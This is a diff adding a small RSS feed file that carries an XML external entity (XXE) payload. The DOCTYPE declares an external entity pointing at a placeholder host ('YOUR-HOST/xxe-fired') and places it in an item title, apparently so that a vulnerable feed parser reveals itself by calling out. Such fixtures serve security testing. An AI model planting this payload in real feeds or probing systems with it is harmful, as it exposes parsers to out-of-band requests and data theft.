@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE rss [<!ENTITY xxe SYSTEM "http://YOUR-HOST/xxe-fired">]>
+<rss version="2.0"><channel>
+  <item><title>&xxe;</title><link>http://example.com</link>
+  <description>x</description><pubDate/></item>
+</channel></rss>
